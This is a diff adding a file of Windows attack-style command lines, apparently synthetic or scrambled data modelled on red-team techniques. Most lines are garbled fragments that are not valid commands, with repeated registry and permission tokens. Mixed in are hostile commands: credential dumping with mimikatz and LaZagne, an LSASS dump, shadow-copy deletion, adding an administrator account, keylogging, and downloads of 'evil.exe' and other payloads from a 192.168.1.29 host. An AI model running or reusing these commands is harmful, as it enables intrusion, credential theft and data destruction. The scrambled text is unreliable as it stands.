@@ -1,0 +1,64 @@
+rundll32 popcalc.dll , keylog
+net localgroup `` hklm\software\microsoft\windows nt\currentversion\windows `` appinit_dlls '' cor_profiler '' /t cor_profiler '' , threadingmodel '' /grant threadingmodel '' ' '' /grant $ f /grant administrators /grant administrators '' c '' file /grant http '' /users
+`` http : //192.168.1.29:9000/payload/redirect.sdb -o .\redirect.sdb
+copy-item `` host `` .\lazagne .. file \\ : $ ( `` http : \users\ $ : set-wmiinstance -namespace cor_profiler '' c '' /grant threadingmodel '' '' /grant threadingmodel '' c '' threadingmodel '' /grant threadingmodel '' -name inprocserver32 '' c '' threadingmodel '' '' -name
+invoke-mimikatz.exe
+bitsadmin.exe /create $ `` `` hkcu\software\microsoft\windows nt\currentversion\winlogon\notify\atomicredteam '' '' file '' '' inputprovider /grant administrators '' '' ' '' -name `` 1 '' -name /grant threadingmodel '' -name autorun /t reg_multi_sz
+copy powershell % windir % fltmc.exe manager\environment '' /grant cor_profiler '' /grant minidump /grant minidump '' \\ $ http : \users\ $ { hklm\system\currentcontrolset\services\winsock2\parameters \users\ admins '' '' -name cor_profiler '' /grant threadingmodel '' /grant threadingmodel '' '' -name `` threadingmodel '' -name $ : threadingmodel
+net localgroup `` altitude
+netsh firewall set opmode
+net localgroup `` cor_profiler '' inputprovider '' /grant autorun '' '' , '' , $ : threadingmodel '' -name f c '' root\subscription '' $ : threadingmodel '' -name threadingmodel '' /grant hklm\system\currentcontrolset\control\session /grant threadingmodel '' -name $ '' root\subscription '' -name threadingmodel '' -name $
+net localgroup `` administrators '' /t cor_profiler /grant minidump http : /export -class \users\ /grant $ hkey_local_machine\system\currentcontrolset\services\ntds '' c cor_profiler '' reg_dword /d `` `` $ : cor_profiler '' '' /grant c c : cor_profiler file /grant $ http : //192.168.1.29:9000/payload/redirect.sdb -o admins '' c cor_profiler
+net user administrator /add admins `` domain -c `` cor_profiler '' '' /t threadingmodel '' -name `` threadingmodel '' /grant threadingmodel '' /t reg_dword /d keylogger_dll.dll = threadingmodel /grant threadingmodel '' $ root\subscription '' '' c : threadingmodel '' -name `` '' threadingmodel '' -name $
+schtasks /create = `` http : //192.168.1.29:9000/payload/evil.exe file ; -
+nbtstat -n
+quser
+iediagcmd.exe /out
+quser
+lazagne.exe windows
+cmdkey /list
+tree
+reg add `` hklm\system\currentcontrolset\control\session manager\environment `` cor_profiler '' /t debugger /grant autorun -- ' '' -name $ : /t select-object mainwindowtitle
+copy-item `` /y $ `` hklm\system\currentcontrolset\control\session cor_profiler '' c cor_profiler '' reg_dword /d 1 /f
+get-localgroupmember query
+rundll32 popcalc.dll , cor_profiler /grant keylog
+bitsadmin.exe /create $ `` domain admins '' c '' nt\currentversion\windows c '' c '' /v cor_profiler '' c cor_profiler '' c cor_profiler '' $ inputprovider '' '' -name reg_dword /d userinit.exe , # : inputprovider ; ''
+copy .\lazagne exe -command -filepath $ `` domain
+vssadmin delete shadow set-wmiinstance -namespace hkey_local_machine\system\currentcontrolset\services\w32time\timeproviders\atomictest '' -name dllname '' '' /grant threadingmodel '' -name threadingmodel '' /grant threadingmodel '' -name $ : \windows\system32\sethc_backup.exe
+copy powershell -ibck -executionpolicy -verbose ''
+wscript $ ( `` cor_profiler -class -verbose ''
+tree
+gpresult /z
+net localgroup `` administrators '' cor_profiler '' '' -name cor_profiler '' c cor_profiler file -group '' '' /grant threadingmodel '' -name `` '' threadingmodel '' /grant administrators '' /grant threadingmodel '' c '' -name threadingmodel '' c '' packages $ $ : \programdata\microsoft\windows\start red team ''
+% net localgroup `` cor_profiler '' c '' powershell /grant cor_profiler '' $ : enabled '' inputprovider '' \windows\temp\lsass_dump.dmp
+nbtstat -n bypass
+vsiisexelauncher.exe -p set-wmiinstance -namespace cor_profiler /grant windir /grant http : http : //192.168.1.29:9000/payload/evil.exe -o .\redirect.sdb
+net localgroup `` hklm\software\microsoft\windows -class __eventfilter -arguments user_name '' /grant cor_profiler '' c '' $ : f '' /grant administrators '' '' -name cor_profiler '' /grant threadingmodel '' '' -name threadingmodel '' /grant reg_dword /d $ : , threadingmodel '' c `` threadingmodel '' /t \windows\system32\sethc_backup.exe
+copy kerberos : :dcsync -new : :logonpasswords -u $ i -l $ { filename_regex } in ;
+net localgroup `` hklm\software\microsoft\windows file `` hklm\software\microsoft\windows \system32\osk.exe /grant administrators /grant keylog
+lazagne.exe windows
+dir popcalc.dll c : windir % appdata % /export c : set-wmiinstance -namespace windir targetinstance.systemuptime /export `` $ '' //raw.githubusercontent.com/s3cur3th1ssh1t mainwindowtitle
+[ -list | | foreach-object http : //192.168.1.29:9000/payload/redirect.sdb -o .\redirect.sdb
+`` http : //192.168.1.29:9000/payload/redirect.sdb -o .\redirect.sdb
+cmdkey /list
+nbtstat -n ''
+$ `` shadow shadow localappdata % \microsoft\teams\current\teams.exe
+iediagcmd.exe /out ;
+remove-item -path `` \microsoft\teams\current\teams.exe
+powershell -ibck -o $ `` domain
+get-localgroup
+wt.exe -l $ `` volumn tracking '' ''
+silentrunner.exe $ { ab8902b4-09ca-4bb6-b78d-a8f59079a8d5 }
+remove-item ( `` http : :logonpasswords -t $ target `` domain '' ;
+attrib +h $ ( cor_profiler = `` '' c .\redirect.sdb
+gobuster dir -name :logonpasswords
+net localgroup `` hklm\system\currentcontrolset\control\session '' manager\environment `` cor_profiler '' '' threadingmodel /grant /format : /t threadingmodel '' '' c administrators '' /grant threadingmodel '' c : threadingmodel '' '' -name `` threadingmodel '' /grant reg_dword /grant threadingmodel '' c : threadingmodel '' /t threadingmodel '' -name
+adfind.exe -o : -namespace $ : \windows\system32\comsvcs.dll , http http : //192.168.1.29:9000/payload/redirect.sdb -o '' os ; file administrators '' /grant -command administrators '' c : cor_profiler http '' /grant threadingmodel '' /grant ' ' ' '' c '' execution packages '' keylogger_dll.dll ' ' '' /grant
+lazagne.exe windows
+iediagcmd.exe /out '' $ true
+net localgroup `` cor_profiler c '' nt\currentversion\windows '' cor_profiler c : `` cor_profiler /grant set-wmiinstance /grant keylog
+gpresult /z
+bitsadmin.exe /create $ `` domain admins '' t1547.009 -verbose
+get-keystrokes
+namp -sn -l $ target t1547.009 nt\currentversion\image file \\ } binpath= set-wmiinstance you hklm\software\microsoft\windows components\atomic_test '' file /grant keylog
+ffuf -w $ consumerargs
